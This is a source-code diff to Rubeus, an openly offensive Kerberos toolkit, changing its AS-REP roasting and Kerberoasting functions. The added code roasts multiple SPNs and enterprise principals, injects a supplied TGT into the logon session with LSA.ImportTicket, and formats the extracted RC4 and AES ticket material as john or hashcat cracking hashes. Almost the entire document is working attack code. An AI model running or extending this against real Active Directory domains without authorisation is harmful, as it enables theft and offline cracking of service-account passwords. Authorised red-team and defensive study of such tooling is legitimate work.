@@ -7,6 +7,7 @@ using System.Security.Principal;
 using System.DirectoryServices;
 using System.DirectoryServices.AccountManagement;
 using System.Collections.Generic;
+using Rubeus.lib.Interop;
 
 namespace Rubeus
 {
@@ -38,7 +39,8 @@ namespace Rubeus
                 // if we have a username, domain, and DC specified, we don't need to search for users and can roast directly
                 GetASRepHash(userName, domain, domainController, format, outFile);
             }
-            else {
+            else
+            {
                 DirectoryEntry directoryObject = null;
                 DirectorySearcher userSearcher = null;
 
@@ -140,7 +142,8 @@ namespace Rubeus
                     if (ex.InnerException != null)
                     {
                         Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.InnerException.Message);
-                    } else
+                    }
+                    else
                     {
                         Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.Message);
                     }
@@ -157,12 +160,12 @@ namespace Rubeus
         public static void GetASRepHash(string userName, string domain, string domainController = "", string format = "", string outFile = "")
         {
             // roast AS-REPs for users without pre-authentication enabled
-            
+
             string dcIP = Networking.GetDCIP(domainController, true, domain);
             if (String.IsNullOrEmpty(dcIP)) { return; }
 
             Console.WriteLine("[*] Building AS-REQ (w/o preauth) for: '{0}\\{1}'", domain, userName);
-            byte[] reqBytes = AS_REQ.NewASReq(userName, domain, Interop.KERB_ETYPE.rc4_hmac);
+            byte[] reqBytes = AS_REQ.NewASReq(userName, domain, Interop.KERB_ETYPE.rc4_hmac).Encode().Encode();
 
             byte[] response = Networking.SendBytes(dcIP, 88, reqBytes);
             if (response == null)
@@ -177,7 +180,7 @@ namespace Rubeus
             // check the response value
             int responseTag = responseAsn.TagValue;
 
-            if (responseTag == 11)
+            if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.AS_REP)
             {
                 Console.WriteLine("[+] AS-REQ w/o preauth successful!");
 
@@ -189,17 +192,17 @@ namespace Rubeus
                 repHash = repHash.Insert(32, "$");
 
                 string hashString = "";
-                if(format == "john")
+                if (format == "john")
                 {
                     hashString = String.Format("$krb5asrep${0}@{1}:{2}", userName, domain, repHash);
                 }
-                else if(format == "hashcat")
+                else if (format == "hashcat")
                 {
                     hashString = String.Format("$krb5asrep$23${0}@{1}:{2}", userName, domain, repHash);
                 }
                 else
                 {
-                  Console.WriteLine("Please provide a cracking format.");
+                    Console.WriteLine("Please provide a cracking format.");
                 }
 
                 if (!String.IsNullOrEmpty(outFile))
@@ -234,7 +237,7 @@ namespace Rubeus
                     Console.WriteLine();
                 }
             }
-            else if (responseTag == 30)
+            else if (responseTag == (int)Interop.KERB_MESSAGE_TYPE.ERROR)
             {
                 // parse the response to an KRB-ERROR
                 KRB_ERROR error = new KRB_ERROR(responseAsn.Sub[0]);
@@ -246,7 +249,7 @@ namespace Rubeus
             }
         }
 
-        public static void Kerberoast(string spn = "", string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false, KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", string pwdSetAfter = "", string pwdSetBefore = "", string ldapFilter = "", int resultLimit = 0, bool userStats = false)
+        public static void Kerberoast(string spn = "", List<string> spns = null, string userName = "", string OUName = "", string domain = "", string dc = "", System.Net.NetworkCredential cred = null, string outFile = "", bool simpleOutput = false, KRB_CRED TGT = null, bool useTGTdeleg = false, string supportedEType = "rc4", string pwdSetAfter = "", string pwdSetBefore = "", string ldapFilter = "", int resultLimit = 0, bool userStats = false, bool enterprise = false, bool autoenterprise = false)
         {
             if (userStats)
             {
@@ -269,6 +272,12 @@ namespace Rubeus
                 Console.WriteLine("[*]         Use /ticket:X or /tgtdeleg to force RC4_HMAC for these accounts.\r\n");
             }
 
+            if ((enterprise) && ((TGT == null) || ((String.IsNullOrEmpty(spn)) && (spns != null) && (spns.Count == 0))))
+            {
+                Console.WriteLine("[X] To use Enterprise Principals, /spn or /spns has to be specified, along with either /ticket or /tgtdeleg");
+                return;
+            }
+
             if (!String.IsNullOrEmpty(spn))
             {
                 Console.WriteLine("\r\n[*] Target SPN             : {0}", spn);
@@ -277,7 +286,7 @@ namespace Rubeus
                 {
                     // if a TGT .kirbi is supplied, use that for the request
                     //      this could be a passed TGT or if TGT delegation is specified
-                    GetTGSRepHash(TGT, spn, "USER", "DISTINGUISHEDNAME", outFile, simpleOutput, dc, Interop.KERB_ETYPE.rc4_hmac);
+                    GetTGSRepHash(TGT, spn, "USER", "DISTINGUISHEDNAME", outFile, simpleOutput, enterprise, dc, Interop.KERB_ETYPE.rc4_hmac);
                 }
                 else
                 {
@@ -285,12 +294,33 @@ namespace Rubeus
                     GetTGSRepHash(spn, "USER", "DISTINGUISHEDNAME", cred, outFile);
                 }
             }
-            else {
+            else if ((spns != null) && (spns.Count != 0))
+            {
+                foreach (string s in spns)
+                {
+                    Console.WriteLine("\r\n[*] Target SPN             : {0}", s);
+
+                    if (TGT != null)
+                    {
+                        // if a TGT .kirbi is supplied, use that for the request
+                        //      this could be a passed TGT or if TGT delegation is specified
+                        GetTGSRepHash(TGT, s, "USER", "DISTINGUISHEDNAME", outFile, simpleOutput, enterprise, dc, Interop.KERB_ETYPE.rc4_hmac);
+                    }
+                    else
+                    {
+                        // otherwise use the KerberosRequestorSecurityToken method
+                        GetTGSRepHash(s, "USER", "DISTINGUISHEDNAME", cred, outFile);
+                    }
+                }
+            }
+            else
+            {
                 if ((!String.IsNullOrEmpty(domain)) || (!String.IsNullOrEmpty(OUName)) || (!String.IsNullOrEmpty(userName)))
                 {
                     if (!String.IsNullOrEmpty(userName))
                     {
-                        if (userName.Contains(",")) {
+                        if (userName.Contains(","))
+                        {
                             Console.WriteLine("[*] Target Users           : {0}", userName);
                         }
                         else
@@ -308,6 +338,51 @@ namespace Rubeus
                     }
                 }
 
+                // inject ticket for LDAP search if supplied
+                if (TGT != null)
+                {
+                    byte[] kirbiBytes = null;
+                    string ticketDomain = TGT.enc_part.ticket_info[0].prealm;
+
+                    if (String.IsNullOrEmpty(domain))
+                    {
+                        // if a domain isn't specified, use the domain from the referral
+                        domain = ticketDomain;
+                    }
+
+                    // referral TGT is in use, we need a service ticket for LDAP on the DC to perform the domain searcher
+                    if (ticketDomain != domain)
+                    {
+                        if (String.IsNullOrEmpty(dc))
+                        {
+                            dc = Networking.GetDCName(domain);
+                        }
+
+                        string tgtUserName = TGT.enc_part.ticket_info[0].pname.name_string[0];
+                        Ticket ticket = TGT.tickets[0];
+                        byte[] clientKey = TGT.enc_part.ticket_info[0].key.keyvalue;
+                        Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)TGT.enc_part.ticket_info[0].key.keytype;
+
+                        // check if we've been given an IP for the DC, we'll need the name for the LDAP service ticket
+                        Match match = Regex.Match(dc, @"([0-9A-Fa-f]{1,4}:){7}[0-9A-Fa-f]{1,4}|(\d{1,3}\.){3}\d{1,3}");
+                        if (match.Success)
+                        {
+                            System.Net.IPAddress dcIP = System.Net.IPAddress.Parse(dc);
+                            System.Net.IPHostEntry dcInfo = System.Net.Dns.GetHostEntry(dcIP);
+                            dc = dcInfo.HostName;
+                        }
+                        
+                        // request a service tickt for LDAP on the target DC
+                        kirbiBytes = Ask.TGS(tgtUserName, ticketDomain, ticket, clientKey, etype, string.Format("ldap/{0}", dc), etype, null, false, dc, false, enterprise, false);
+                    }
+                    // otherwise inject the TGT to perform the domain searcher
+                    else
+                    {
+                        kirbiBytes = TGT.Encode().Encode();
+                    }
+                    LSA.ImportTicket(kirbiBytes, new LUID());
+                }
+
                 DirectoryEntry directoryObject = null;
                 DirectorySearcher userSearcher = null;
 
@@ -323,7 +398,8 @@ namespace Rubeus
                     if (ex.InnerException != null)
                     {
                         Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.InnerException.Message);
-                    } else
+                    }
+                    else
                     {
                         Console.WriteLine("\r\n[X] Error creating the domain searcher: {0}", ex.Message);
                     }
@@ -359,13 +435,15 @@ namespace Rubeus
                 try
                 {
                     string userFilter = "";
+
                     if (!String.IsNullOrEmpty(userName))
                     {
                         if (userName.Contains(","))
                         {
                             // searching for multiple specified users, ensuring they're not disabled accounts
                             string userPart = "";
-                            foreach (string user in userName.Split(',')) {
+                            foreach (string user in userName.Split(','))
+                            {
                                 userPart += String.Format("(samAccountName={0})", user);
                             }
                             userFilter = String.Format("(&(|{0})(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))", userPart);
@@ -438,11 +516,11 @@ namespace Rubeus
                         userSearchFilter = String.Format("(&(samAccountType=805306368)(servicePrincipalName=*){0}{1})", userFilter, encFilter);
                     }
 
-                    if(!String.IsNullOrEmpty(ldapFilter))
+                    if (!String.IsNullOrEmpty(ldapFilter))
                     {
                         userSearchFilter = String.Format("(&{0}({1}))", userSearchFilter, ldapFilter);
                     }
-                    
+
                     userSearcher.Filter = userSearchFilter;
                 }
                 catch (Exception ex)
@@ -480,35 +558,47 @@ namespace Rubeus
                         string samAccountName = user.Properties["samAccountName"][0].ToString();
                         string distinguishedName = user.Properties["distinguishedName"][0].ToString();
                         string servicePrincipalName = user.Properties["servicePrincipalName"][0].ToString();
-                        long lastPwdSet = (long)(user.Properties["pwdlastset"][0]);
-                        DateTime pwdLastSet = DateTime.FromFileTimeUtc(lastPwdSet);
+
+
+                        DateTime? pwdLastSet = null;
+                        if (user.Properties.Contains("pwdlastset"))
+                        {
+                            long lastPwdSet = (long)(user.Properties["pwdlastset"][0]);
+                            pwdLastSet = DateTime.FromFileTimeUtc(lastPwdSet);
+                        }
+
                         Interop.SUPPORTED_ETYPE supportedETypes = (Interop.SUPPORTED_ETYPE)0;
                         if (user.Properties.Contains("msDS-SupportedEncryptionTypes"))
                         {
                             supportedETypes = (Interop.SUPPORTED_ETYPE)user.Properties["msDS-SupportedEncryptionTypes"][0];
                         }
 
-                        try
+                        if (!userETypes.ContainsKey(supportedETypes))
                         {
-                            if (!userETypes.ContainsKey(supportedETypes))
-                            {
-                                userETypes[supportedETypes] = 1;
-                            }
-                            else
-                            {
-                                userETypes[supportedETypes] = userETypes[supportedETypes] + 1;
-                            }
-                            int year = (int)pwdLastSet.Year;
-                            if (!userPWDsetYears.ContainsKey(year))
-                            {
-                                userPWDsetYears[year] = 1;
-                            }
-                            else
-                            {
-                                userPWDsetYears[year] = userPWDsetYears[year] + 1;
-                            }
+                            userETypes[supportedETypes] = 1;
                         }
-                        catch { }
+                        else
+                        {
+                            userETypes[supportedETypes] = userETypes[supportedETypes] + 1;
+                        }
+
+                        if (pwdLastSet == null)
+                        {
+                            // pwdLastSet == null with new accounts and
+                            // when a password is set to never expire
+                            if (!userPWDsetYears.ContainsKey(-1))
+                                userPWDsetYears[-1] = 1;
+                            else
+                                userPWDsetYears[-1] += 1;
+                        }
+                        else
+                        {
+                            int year = pwdLastSet.Value.Year;
+                            if (!userPWDsetYears.ContainsKey(year))
+                                userPWDsetYears[year] = 1;
+                            else
+                                userPWDsetYears[year] += 1;
+                        }
 
                         if (!userStats)
                         {
@@ -521,7 +611,7 @@ namespace Rubeus
                                 Console.WriteLine("[*] Supported ETypes       : {0}", supportedETypes);
                             }
 
-                            if (!String.IsNullOrEmpty(domain))
+                            if ((!String.IsNullOrEmpty(domain)) && (TGT == null))
                             {
                                 servicePrincipalName = String.Format("{0}@{1}", servicePrincipalName, domain);
                             }
@@ -538,12 +628,24 @@ namespace Rubeus
                                    )
                                 {
                                     // if we're roasting RC4, but AES is supported AND we have a TGT, specify RC4
-                                    GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, dc, Interop.KERB_ETYPE.rc4_hmac);
+                                    bool result = GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc, Interop.KERB_ETYPE.rc4_hmac);
+                                    if (!result && autoenterprise)
+                                    {
+                                        Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
+                                        servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
+                                        GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, true, dc, Interop.KERB_ETYPE.rc4_hmac);
+                                    }
                                 }
                                 else
                                 {
                                     // otherwise don't force RC4 - have all supported encryption types for opsec reasons
-                                    GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, dc);
+                                    bool result = GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, enterprise, dc);
+                                    if (!result && autoenterprise)
+                                    {
+                                        Console.WriteLine("\r\n[-] Retrieving service ticket with SPN failed and '/autoenterprise' passed, retrying with the enterprise principal");
+                                        servicePrincipalName = String.Format("{0}@{1}", samAccountName, domain);
+                                        GetTGSRepHash(TGT, servicePrincipalName, samAccountName, distinguishedName, outFile, simpleOutput, true, dc);
+                                    }
                                 }
                             }
                             else
@@ -561,7 +663,7 @@ namespace Rubeus
                         Console.WriteLine();
 
                         // display stats about the users found
-                        foreach(var item in userETypes)
+                        foreach (var item in userETypes)
                         {
                             eTypeTable.AddRow(item.Key.ToString(), item.Value.ToString());
                         }
@@ -576,7 +678,7 @@ namespace Rubeus
                 }
                 catch (Exception ex)
                 {
-                    Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex.InnerException.Message);
+                    Console.WriteLine("\r\n[X] Error executing the domain searcher: {0}", ex);
                     return;
                 }
             }
@@ -616,14 +718,14 @@ namespace Rubeus
                 }
                 byte[] requestBytes = ticket.GetRequest();
 
-                if ( !((requestBytes[15] == 1) && (requestBytes[16] == 0)) )
+                if (!((requestBytes[15] == 1) && (requestBytes[16] == 0)))
                 {
                     Console.WriteLine("\r\n[X] GSSAPI inner token is not an AP_REQ.\r\n");
                     return;
                 }
 
                 // ignore the GSSAPI frame
-                byte[] apReqBytes = new byte[requestBytes.Length-17];
+                byte[] apReqBytes = new byte[requestBytes.Length - 17];
                 Array.Copy(requestBytes, 17, apReqBytes, 0, requestBytes.Length - 17);
 
                 AsnElt apRep = AsnElt.Decode(apReqBytes);
@@ -641,7 +743,7 @@ namespace Rubeus
                     {
                         foreach (AsnElt elem2 in elem.Sub[0].Sub[0].Sub)
                         {
-                            if(elem2.TagValue == 3)
+                            if (elem2.TagValue == 3)
                             {
                                 foreach (AsnElt elem3 in elem2.Sub[0].Sub)
                                 {
@@ -654,8 +756,20 @@ namespace Rubeus
                                     {
                                         byte[] cipherTextBytes = elem3.Sub[0].GetOctetString();
                                         string cipherText = BitConverter.ToString(cipherTextBytes).Replace("-", "");
+                                        string hash = "";
 
-                                        string hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));
+                                        if ((encType == 18) || (encType == 17))
+                                        {
+                                            //Ensure checksum is extracted from the end for aes keys
+                                            int checksumStart = cipherText.Length - 24;
+                                            //Enclose SPN in *s rather than username, realm and SPN. This doesn't impact cracking, but might affect loading into hashcat.
+                                            hash = String.Format("$krb5tgs${0}${1}${2}$*{3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
+                                        }
+                                        //if encType==23
+                                        else
+                                        {
+                                            hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, userName, domain, spn, cipherText.Substring(0, 32), cipherText.Substring(32));
+                                        }
 
                                         if (!String.IsNullOrEmpty(outFile))
                                         {
@@ -711,7 +825,7 @@ namespace Rubeus
             }
         }
 
-        public static void GetTGSRepHash(KRB_CRED TGT, string spn, string userName = "user", string distinguishedName = "", string outFile = "", bool simpleOutput = false, string domainController = "", Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial)
+        public static bool GetTGSRepHash(KRB_CRED TGT, string spn, string userName = "user", string distinguishedName = "", string outFile = "", bool simpleOutput = false, bool enterprise = false, string domainController = "", Interop.KERB_ETYPE requestEType = Interop.KERB_ETYPE.subkey_keymaterial)
         {
             // use a TGT blob to request a hash instead of the KerberosRequestorSecurityToken method
             string userDomain = "DOMAIN";
@@ -723,27 +837,34 @@ namespace Rubeus
                 string domainDN = dnMatch.Groups["Domain"].ToString();
                 userDomain = domainDN.Replace("DC=", "").Replace(',', '.');
             }
-
+            
             // extract out the info needed for the TGS-REQ request
             string tgtUserName = TGT.enc_part.ticket_info[0].pname.name_string[0];
-            string domain = TGT.enc_part.ticket_info[0].prealm;
+            string domain = TGT.enc_part.ticket_info[0].prealm.ToLower();
             Ticket ticket = TGT.tickets[0];
             byte[] clientKey = TGT.enc_part.ticket_info[0].key.keyvalue;
             Interop.KERB_ETYPE etype = (Interop.KERB_ETYPE)TGT.enc_part.ticket_info[0].key.keytype;
 
-            string[] services = spn.Split(',');
-            foreach (string sname in services)
+            // request the new service ticket
+            byte[] tgsBytes = null;
+            if (domain.ToLower() != userDomain.ToLower())
             {
-                // request the new service tickt
-                byte[] tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, sname, requestEType, null, false, domainController, false);
-
-                if (tgsBytes != null)
-                {
-                    KRB_CRED tgsKirbi = new KRB_CRED(tgsBytes);
-                    DisplayTGShash(tgsKirbi, true, userName, userDomain, outFile, simpleOutput);
-                    Console.WriteLine();
-                }
+                tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, spn, requestEType, null, false, domainController, false, enterprise, false);
             }
+            else
+            {
+                tgsBytes = Ask.TGS(tgtUserName, domain, ticket, clientKey, etype, spn, requestEType, null, false, domainController, false, enterprise, true);
+            }
+
+            if (tgsBytes != null)
+            {
+                KRB_CRED tgsKirbi = new KRB_CRED(tgsBytes);
+                DisplayTGShash(tgsKirbi, true, userName, userDomain, outFile, simpleOutput);
+                Console.WriteLine();
+                return true;
+            }
+
+            return false;
         }
 
         public static void DisplayTGShash(KRB_CRED cred, bool kerberoastDisplay = false, string kerberoastUser = "USER", string kerberoastDomain = "DOMAIN", string outFile = "", bool simpleOutput = false)
@@ -756,7 +877,20 @@ namespace Rubeus
             string sname = string.Join("/", cred.enc_part.ticket_info[0].sname.name_string.ToArray());
 
             string cipherText = BitConverter.ToString(cred.tickets[0].enc_part.cipher).Replace("-", string.Empty);
-            string hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(0, 32), cipherText.Substring(32));
+
+            string hash = "";
+            //Aes needs to be treated differently, as the checksum is the last 24, not the first 32.
+            if ((encType == 18) || (encType == 17))
+            {
+                int checksumStart = cipherText.Length - 24;
+                //Enclose SPN in *s rather than username, realm and SPN. This doesn't impact cracking, but might affect loading into hashcat.            
+                hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(checksumStart), cipherText.Substring(0, checksumStart));
+            }
+            //if encType==23
+            else
+            {
+                hash = String.Format("$krb5tgs${0}$*{1}${2}${3}*${4}${5}", encType, kerberoastUser, kerberoastDomain, sname, cipherText.Substring(0, 32), cipherText.Substring(32));
+            }
 
             if (!String.IsNullOrEmpty(outFile))
             {
@@ -778,7 +912,7 @@ namespace Rubeus
             else
             {
                 bool header = false;
-                if (Rubeus.Program.wrapTickets) 
+                if (Rubeus.Program.wrapTickets)
                 {
                     foreach (string line in Helpers.Split(hash, 80))
                     {
